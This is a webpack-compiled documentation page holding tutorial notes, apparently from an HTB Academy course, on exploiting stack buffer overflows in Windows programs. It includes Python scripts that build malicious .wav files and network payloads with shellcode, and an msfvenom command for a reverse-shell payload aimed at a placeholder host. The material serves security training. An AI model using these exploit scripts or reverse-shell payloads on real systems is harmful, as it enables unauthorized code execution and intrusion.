"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[1724],{8453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>r});var s=t(6540);const i={},o=s.createContext(i);function a(e){const n=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(o.Provider,{value:n},e.children)}},9420:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"Hacking/HTB Academy/Stack-based buffer overflow on Windows","title":"Stack based buffer overflow on Windows","description":"In Binary exploitation, our primary goal is to subvert the binary\'s execution in a way that benefits us.","source":"@site/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows.md","sourceDirName":"Hacking/HTB Academy","slug":"/Hacking/HTB Academy/Stack-based buffer overflow on Windows","permalink":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Stack based buffer overflow on Linux","permalink":"/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux"},"next":{"title":"Web fuzzing","permalink":"/docs/Hacking/HTB Academy/Web fuzzing"}}');var i=t(4848),o=t(8453);const a={},r="Stack based buffer overflow on Windows",l={},c=[{value:"Stack overflow",id:"stack-overflow",level:2},{value:"Debugging Windows Programs",id:"debugging-windows-programs",level:2},{value:"Identify and fuzzing input fields",id:"identify-and-fuzzing-input-fields",level:2},{value:"EIP Offset",id:"eip-offset",level:2},{value:"Controlling the EIP",id:"controlling-the-eip",level:2},{value:"Bad characters",id:"bad-characters",level:2},{value:"Jumping to Stack",id:"jumping-to-stack",level:2},{value:"Generating the shellcode",id:"generating-the-shellcode",level:2},{value:"Remote fuzzing",id:"remote-fuzzing",level:2},{value:"Building a remote exploit",id:"building-a-remote-exploit",level:2}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"stack-based-buffer-overflow-on-windows",children:"Stack based buffer overflow on Windows"})}),"\n",(0,i.jsx)(n.p,{children:"In Binary exploitation, our primary goal is to subvert the binary's execution in a way that benefits us."}),"\n",(0,i.jsxs)(n.p,{children:["A buffer overflow occurs when a program receives data that is longer than expected, such that it overwrites the entire buffer memory space on the stack. This can overwrite the next Instruction Pointer ",(0,i.jsx)(n.code,{children:"EIP"})," (or RIP in x86_64), which causes the program to crash because it will attempt to execute instructions at an invalid memory address."]}),"\n",(0,i.jsxs)(n.p,{children:["With this attack we can control the whole memory. We can place a shellcode and point the ",(0,i.jsx)(n.code,{children:"EIP"})," pointer to the shellcode, so that it is executed."]}),"\n",(0,i.jsxs)(n.p,{children:["With advanced protections, we will not be able to load the shellcode entirely. Instad, we would need to rely on ",(0,i.jsx)(n.code,{children:"Return Oriented Programming (ROP)"}),". In this attack, we may use a combination of instructions from the binary to execute a particular function and overwrite various pointers to change the program execution flow."]}),"\n",(0,i.jsx)(n.h2,{id:"stack-overflow",children:"Stack overflow"}),"\n",(0,i.jsxs)(n.p,{children:["The stack works in Least-In-First-Out mode: we can only remove from the stack (",(0,i.jsx)(n.code,{children:"pop"}),") the last inserted element (",(0,i.jsx)(n.code,{children:"push"}),"). When we push an element to the stack, it will be in the top of the stack, when we pop, we pop from the top of the stack."]}),"\n",(0,i.jsx)(n.p,{children:"When we send a string that is longer than expected, it overwrites other existing values on the stack and would even overwrite the entire stack if it is long enough. Most importantly, we see that it overwrote the value at EIP,"}),"\n",(0,i.jsx)(n.p,{children:"This happens because of the LIFO design of the stack, which grows upwards, while a long string overflows values downwards until it eventually overwrites the return address EIP and the bottom of the stack pointer EBP."}),"\n",(0,i.jsx)(n.p,{children:"Whenever a function is called, a new stack frame is created, and the old EIP address gets pushed to the top of the new stack frame, so the program knows where to return once the function is finished."}),"\n",(0,i.jsx)(n.p,{children:"If we calculate our input precisely, we can place a valid address in the location where EIP is stored. This would lead the program to go to our overwritten address when it returns and subvert the program execution flow to an address of our choosing."}),"\n",(0,i.jsx)(n.h2,{id:"debugging-windows-programs",children:"Debugging Windows Programs"}),"\n",(0,i.jsxs)(n.p,{children:["We need a debugger to follow the execution path and see the memory contents. An example of a good debugger is ",(0,i.jsx)(n.code,{children:"x64dbg"}),". We can install ",(0,i.jsx)(n.a,{href:"https://github.com/Andy53/ERC.Xdbg",children:"ERC.Xdbg"})," plugin to help us with binary exploitation techniques."]}),"\n",(0,i.jsxs)(n.p,{children:["With ",(0,i.jsx)(n.code,{children:"x64dbg"})," one can run a program from it, or attach the debugger to a running program."]}),"\n",(0,i.jsx)(n.h2,{id:"identify-and-fuzzing-input-fields",children:"Identify and fuzzing input fields"}),"\n",(0,i.jsx)(n.p,{children:"Despite Linux applications, Windows applications are visual and might provide several inputs to the user. Maybe not all of them are vulnerable to the attack. Examples of potential inputs are:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Text input fields"}),"\n",(0,i.jsx)(n.li,{children:"Opened files"}),"\n",(0,i.jsx)(n.li,{children:"Program arguments"}),"\n",(0,i.jsx)(n.li,{children:"Remote resources"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"We should look for a field that expects a short input, like a field that sets the date, as the date is usually short so that the developers may expect a short input only."}),"\n",(0,i.jsx)(n.p,{children:"Another common thing we should look for is fields that are expected to be processed somehow, like the license number registration field, as it will probably be run on a specific function to test whether it is a correct license number. The same applies to opened files, as opened files tend to be processed after being opened."}),"\n",(0,i.jsx)(n.p,{children:"For example for fuzzing text input file, we can generate a long input with:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-ps1",children:"python -c \"print('A'*10000)\"\n"})}),"\n",(0,i.jsx)(n.p,{children:"and pass it to the input, if the program crash, most likely it's because of buffer overflow."}),"\n",(0,i.jsx)(n.p,{children:"If the application allows to load files, we can leverage a similar technique. One can write dummy data to a file and have it loaded in the application:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-ps1",children:"python -c \"print('A'*10000, file=open('fuzz.wav', 'w'))\"\n"})}),"\n",(0,i.jsxs)(n.p,{children:["When we open the file in the application, the application crash, which is a good sympton to spotting the vulnerability. When we do the same but with the process attached to the debugger, we see that the message indicates that the program tried to execute the address ",(0,i.jsx)(n.code,{children:"41414141"}),". In ASCII, the upper case A has hex code ",(0,i.jsx)(n.code,{children:"0x41"}),", so it looks like the program tried to go to address AAAA, which means that we have successfully changed the EIP address."]}),"\n",(0,i.jsxs)(n.p,{children:["We can also check the registers in the debugger and we'll see ",(0,i.jsx)(n.code,{children:"EBP"})," and ",(0,i.jsx)(n.code,{children:"EIP"})," registers overwritten with ",(0,i.jsx)(n.code,{children:"41414141"}),"."]}),"\n",(0,i.jsx)(n.h2,{id:"eip-offset",children:"EIP Offset"}),"\n",(0,i.jsx)(n.p,{children:"Now we know the application is vulnerable to buffer overflow. Now we need to determine the exact offset we need to use to land in the EIP address."}),"\n",(0,i.jsxs)(n.p,{children:["In Linux, we'd use the metasploit create_pattern tool to create a pattern to observe which part gets into the EIP. In Windows, we can use the ",(0,i.jsx)(n.code,{children:"ERC"})," plugin."]}),"\n",(0,i.jsxs)(n.p,{children:["We can do it by executing ",(0,i.jsx)(n.code,{children:"ERC --pattern c 5000"})," in xdbg console, we'll see the result in the ",(0,i.jsx)(n.code,{children:"Log"})," tab."]}),"\n",(0,i.jsxs)(n.p,{children:["Now we need to write the pattern into a wav file and run the program. The ",(0,i.jsx)(n.code,{children:"EIP"})," register will contain some value, that we need to retrieve in ASCII and then invoke ",(0,i.jsx)(n.code,{children:"ERC"})," again with the value:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-ps1",children:"ERC --pattern o 1hF0\n"})}),"\n",(0,i.jsx)(n.p,{children:"And this will return the value of the offset."}),"\n",(0,i.jsx)(n.h2,{id:"controlling-the-eip",children:"Controlling the EIP"}),"\n",(0,i.jsx)(n.p,{children:"Now we know exactly how many bytes we need to send in the input to arrive to the EIP, the next 4 bytes will be the value we write into the EIP. We can create a small python script that generates the payload and save it as a wav file."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"def eip_control():\n    offset = 4112\n    buffer = b\"A\"*offset\n    eip = b\"B\"*4\n    payload = buffer + eip\n    \n    with open('control.wav', 'wb') as f:\n        f.write(payload)\n\neip_control()\n"})}),"\n",(0,i.jsxs)(n.p,{children:["The next step is to run the program with this input and verify that we see ",(0,i.jsx)(n.code,{children:"42424242"})," in the EIP register. (",(0,i.jsx)(n.code,{children:"42"})," hex corresponds to ",(0,i.jsx)(n.code,{children:"B"}),")."]}),"\n",(0,i.jsx)(n.h2,{id:"bad-characters",children:"Bad characters"}),"\n",(0,i.jsxs)(n.p,{children:["Exactly in the sammer way of Linux, there are certain characters we shall avoid while building the shellcode. To do so, we can use ",(0,i.jsx)(n.code,{children:"ERC"})," plugin:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-ps1",children:"ERC --bytearray\n"})}),"\n",(0,i.jsx)(n.p,{children:"This creates two files on our Desktop:"}),"\n",(0,i.jsx)(n.p,{children:"ByteArray_1.txt: Which contains the string of all characters we can use in our python exploit\nByteArray_1.bin: Which we can use with ERC later to compare with our input in memory."}),"\n",(0,i.jsx)(n.p,{children:"Now, we can add the bad chars defined in the txt file into the payload script:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"def bad_chars():\n    all_chars = bytes([\n        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,\n        ...SNIP...\n        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF\n    ])\n    \n    offset = 4112\n    buffer = b\"A\"*offset\n    eip = b\"B\"*4\n    payload = buffer + eip + all_chars\n    \n    with open('chars.wav', 'wb') as f:\n        f.write(payload)\n\nbad_chars()\n"})}),"\n",(0,i.jsxs)(n.p,{children:["and generate the payload again and run the program. First, we make sure the EIP is overriden with the expected value. We can then get the top of the stack with the ",(0,i.jsx)(n.code,{children:"ESP"})," register and invoke ERC again:"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"ERC --compare 0014F974 C:\\Users\\htb-student\\Desktop\\ByteArray_1.bin"})}),"\n",(0,i.jsxs)(n.p,{children:["Where ",(0,i.jsx)(n.code,{children:"0014F974"})," is the value of ",(0,i.jsx)(n.code,{children:"ESP"}),". The all chars data start at the top of the stack. The output compares the memory and all the chars available byte by byte. In the example, we see that after the first character, 00, all remaining bytes are different. This indicates that 0x00 truncated the remaining input, and hence it should be considered a bad character."]}),"\n",(0,i.jsx)(n.p,{children:"Now that we know the first bad character, we can repeat the process by specific the bad characters:"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"ERC --bytearray -bytes 0x00"}),". This will generate again the two files but without the specified bad character. This should be repeated until all characters match."]}),"\n",(0,i.jsx)(n.h2,{id:"jumping-to-stack",children:"Jumping to Stack"}),"\n",(0,i.jsxs)(n.p,{children:["In order to find the address whose value we want to place in EIP. We can use a legacy method called ",(0,i.jsx)(n.code,{children:"Jumping to Stack"}),". We'll redirect the EIP point to the top of the stack, and we'll place the shellcode directly in the input data. This is considered a legacy method because it will not work in modern machines. In order to do so, we can:"]}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Write the ESP address in the EIP."}),"\n",(0,i.jsx)(n.li,{children:"Use a JMP ESP instruction."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Modern systems and programs are compiled with the NX bit on the stack or the DEP memory protection in Windows, which prevents executing any code written on the stack. So, even if we would write the shellcode on the stack, it would not be executable, nor would we find a JMP ESP instruction we can use within the program."}),"\n",(0,i.jsxs)(n.p,{children:["Writing the ESP address might not work because of the bad characters. It's more realiable to use the ",(0,i.jsx)(n.code,{children:"JMP ESP"})," instruction. Any machine code in the program that contains the ",(0,i.jsx)(n.code,{children:"JMP ESP"})," will be useful. We should search inside the program's ",(0,i.jsx)(n.code,{children:"exe"})," file, the program's ",(0,i.jsx)(n.code,{children:"dll"})," files or the OS ",(0,i.jsx)(n.code,{children:"dll"})," files used by the program."]}),"\n",(0,i.jsxs)(n.p,{children:["We can have such files by calling ",(0,i.jsx)(n.code,{children:"ERC --ModuleInfo"}),"."]}),"\n",(0,i.jsxs)(n.p,{children:["Make sure the executables listed do not have any protection such as ",(0,i.jsx)(n.code,{children:"NXCompat"}),", ",(0,i.jsx)(n.code,{children:"ASLR"})," or ",(0,i.jsx)(n.code,{children:"Rebase"}),"."]}),"\n",(0,i.jsxs)(n.p,{children:["Once we identified the viables files, we can go to the ",(0,i.jsx)(n.code,{children:"Symbols"})," tag, double click in the file and search for the ",(0,i.jsx)(n.code,{children:"JMP ESP"})," instruction. To search, just simply use ",(0,i.jsx)(n.code,{children:"CTRL+F"})," and enter ",(0,i.jsx)(n.code,{children:"jmp esp"}),"."]}),"\n",(0,i.jsx)(n.p,{children:"As previously, we need to make sure the address does not contain any bad character."}),"\n",(0,i.jsxs)(n.p,{children:["Another example of a basic command to jump to the stack is ",(0,i.jsx)(n.code,{children:"PUSH ESP"})," followed by ",(0,i.jsx)(n.code,{children:"RET"}),". Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. We can use ",(0,i.jsx)(n.a,{href:"https://defuse.ca/online-x86-assembler.htm#disassembly",children:"Online Assemblers"}),", or the msf-nasm_shell tool to convert any assembly instructions to machine code. Both of these take an assembly instruction and give us the corresponding machine code."]}),"\n",(0,i.jsxs)(n.p,{children:["Now, we can go to the CPU tab and search patterns using ",(0,i.jsx)(n.code,{children:"CTRL+B"})," and enter the assembler code into the hex field. It's important to search for entire block!"]}),"\n",(0,i.jsx)(n.h2,{id:"generating-the-shellcode",children:"Generating the shellcode"}),"\n",(0,i.jsxs)(n.p,{children:["We can use ",(0,i.jsx)(n.code,{children:"msfvenom"})," to generate the shellcode. We can list our installed payload for windows with:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"msfvenom -l payloads | grep windows\n"})}),"\n",(0,i.jsx)(n.p,{children:"As a proof of concept, we can try to generate a shellcode that will execute the calculator:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\\x00'\n"})}),"\n",(0,i.jsx)(n.p,{children:"Now that we have our shellcode, we can write the final payload that we'll write to the .wav file to be opened in our program. So far, we know the following:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:'buffer: We can fill the buffer by writing b"A"*offset'}),"\n",(0,i.jsx)(n.li,{children:"EIP: The following 4 bytes should be our return address"}),"\n",(0,i.jsx)(n.li,{children:"buf: After that, we can add our shellcode."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"In the previous section, we found multiple result address:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Directly ESP address"}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"JMP ESP"})," addresses"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"PUSH ESP; RET"})," addresses"]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["To write the address in the script, we can use ",(0,i.jsx)(n.code,{children:"pack"})," function and tell it to use little-endian:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"    eip = pack('<L', 0x00419D0B)\n"})}),"\n",(0,i.jsx)(n.p,{children:"Now that we have buffer and eip, we can add our shellcode after them and generate our .wav file. However, depending on the program's current Stack Frame and Stack Alignment, by the time our JMP ESP instruction is executed, the top of the stack address ESP may have moved slightly. The first few bytes of our shellcode may get skipped, which will lead the shellcode to fail."}),"\n",(0,i.jsxs)(n.p,{children:["To prevent this, we can add a few NOP bytes before our shellcode, which has the machine code ",(0,i.jsx)(n.code,{children:"0x90"}),". The stack alignment needed is usually not more than 16 bytes in most cases, and it may rarely reach 32 bytes. Since we have a lot of buffer space, we'll just add 32 bytes of NOP before our shellcode."]}),"\n",(0,i.jsx)(n.p,{children:"The final script to generate the payload is:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"def exploit():\n    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\\x00'\n    shellcode = b\"\"\n    ...SNIP...\n    shellcode += b\"\\xfd\\x2c\\x39\\x51\\x60\\xbf\\xa1\\xb8\\x07\\x47\\x43\\xc5\"\n\n    offset = 4112\n    buffer = b\"A\"*offset\n    eip = pack('<L', 0x00419D0B)\n    nop = b\"\\x90\"*32\n    payload = buffer + eip + nop + shellcode\n\n    with open('exploit.wav', 'wb') as f:\n        f.write(payload)\n\nexploit()\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Now, when we run the program and load the ",(0,i.jsx)(n.code,{children:"exploit.wav"})," file, the calculator will open."]}),"\n",(0,i.jsxs)(n.p,{children:["To gain code execution, we just need to replace ",(0,i.jsx)(n.code,{children:"calc.exe"})," by ",(0,i.jsx)(n.code,{children:"cmd.exe"}),". In order to get a reverse shell, we should select another payload for the shellcode:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# List all reverse shell payloads for windows\nmsfvenom -l payloads | grep windows | grep reverse\n# Generate the shellcode\nmsfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'\n"})}),"\n",(0,i.jsx)(n.h2,{id:"remote-fuzzing",children:"Remote fuzzing"}),"\n",(0,i.jsx)(n.p,{children:"So far, we have been discussing about local buffer overflow. When it comes to remote, most of the parts are exactly the same, but the exploit construction is slightly different."}),"\n",(0,i.jsx)(n.p,{children:"Let's imagine we have a program that listens in port 8888 and accepts an input via network. We can automate the process of crashing with it with a small python script:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import socket\nfrom struct import pack\n\nIP = "127.0.0.1"\nport = 8888\n\ndef fuzz():\n    try:\n        for i in range(0,10000,500):\n            buffer = b"A"*i\n            print("Fuzzing %s bytes" % i)\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((IP, port))\n            s.send(buffer)\n            breakpoint()\n            s.close()\n    except:\n        print("Could not establish a connection")\n\nfuzz()\n'})}),"\n",(0,i.jsxs)(n.p,{children:["When the script is executed, it loops through all the range. However, in the debugger, we see the EIP register overwritten with ",(0,i.jsx)(n.code,{children:"A"}),". This indicates that the networking part is not vulnerable to buffer overflow, however the user-facing program it is and must be processing the input somehow."]}),"\n",(0,i.jsx)(n.p,{children:"We can do this gradually by placing a breakpoint in the for loop to be able to give us some time to check the EIP register."}),"\n",(0,i.jsx)(n.h2,{id:"building-a-remote-exploit",children:"Building a remote exploit"}),"\n",(0,i.jsx)(n.p,{children:"After fuzzing the listening port, the remaining buffer overflow identification and exploitation steps should be largely the same as local buffer overflow exploitation. The main steps we followed in previous sections were:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Fuzzing Parameters"}),"\n",(0,i.jsx)(n.li,{children:"Controlling EIP"}),"\n",(0,i.jsx)(n.li,{children:"Identifying Bad Characters"}),"\n",(0,i.jsx)(n.li,{children:"Finding a Return Instruction"}),"\n",(0,i.jsx)(n.li,{children:"Jumping to Shellcode"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"Next, we need to determine the offset to write to the EIP. We do that by sending the data in the same way as we have been fuzzing the parameters. Then, check the EIP can be override with different value, then find bad characters, then find a good return address and finally generate the shellcode."}),"\n",(0,i.jsx)(n.p,{children:"The final exploit will be something like:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"def exploit():\n    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'\n    buf = b\"\"\n    ...SNIP...\n    buf += b\"\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\"\n\n    offset = 1052\n    buffer = b\"A\"*offset\n    eip = pack('<L', 0x0069D2E5)\n    nop = b\"\\x90\"*32\n    payload = buffer + eip + nop + buf\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((IP, port))\n    s.send(payload)\n    s.close()\n\nexploit()\n"})}),"\n",(0,i.jsx)(n.p,{children:"We can change the payload to a reverse shell one and change the IP and port to effectively gain code execution over the remote server."})]})}function d(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}}}]);